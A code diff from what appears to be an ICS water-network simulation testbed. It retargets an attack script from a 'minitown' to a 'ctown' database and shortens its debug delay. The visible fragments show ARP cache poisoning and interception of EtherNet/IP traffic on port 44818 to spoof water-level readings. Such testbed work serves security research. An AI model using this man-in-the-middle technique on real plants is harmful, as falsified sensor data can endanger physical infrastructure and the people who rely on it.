@@ -13,7 +13,7 @@ from ips import PLC_IPS
 import sqlite3
 
 # connection to the database
-conn = sqlite3.connect('../../ICS_topologies/minitown_topology_dataset_generation/minitown_db.sqlite')
+conn = sqlite3.connect('../../ICS_topologies/ctown_topology/ctown_db.sqlite')
 c = conn.cursor()
 iteration = 0
 enip_port = 44818
@@ -35,14 +35,14 @@ def spoof_value(raw):
     print ("Spoofing-----------")
     float_value = translate_load_to_float(raw)
     fake_value = float_value + 2.9
-    c.execute("UPDATE minitown SET value = 3 WHERE name = 'ATT_1'")
+    c.execute("UPDATE ctown SET value = 3 WHERE name = 'ATT_1'")
     conn.commit()
     pay = translate_float_to_load(fake_value, raw[0], raw[1])
     return pay
 
 def capture(packet):
     print("Packet...")
-    c.execute("UPDATE minitown SET value = 1 WHERE name = 'ATT_1'")
+    c.execute("UPDATE ctown SET value = 1 WHERE name = 'ATT_1'")
     conn.commit()
     pkt = IP(packet.get_payload())
     if len(pkt) == 102:
@@ -113,7 +113,7 @@ def __setdown(port):
 
     nfqueue.unbind()
     print("[*] Stopping water level spoofing")
-    c.execute("UPDATE minitown SET value = 0 WHERE name = 'ATT_1'")
+    c.execute("UPDATE ctown SET value = 0 WHERE name = 'ATT_1'")
     conn.commit()
 
 def launch_arp_poison():
@@ -146,7 +146,7 @@ def spoof_arp_cache(targetip, targetmac, sourceip):
 if __name__ == '__main__':
     sleep_count = 0
     sleep_limit = 576
-    #sleep_limit = 3 #for debug onlyu
+    sleep_limit = 1 #for debug onlyu
     print('[] Preparing attack')
     while sleep_count < sleep_limit:
         sleep_count += 1
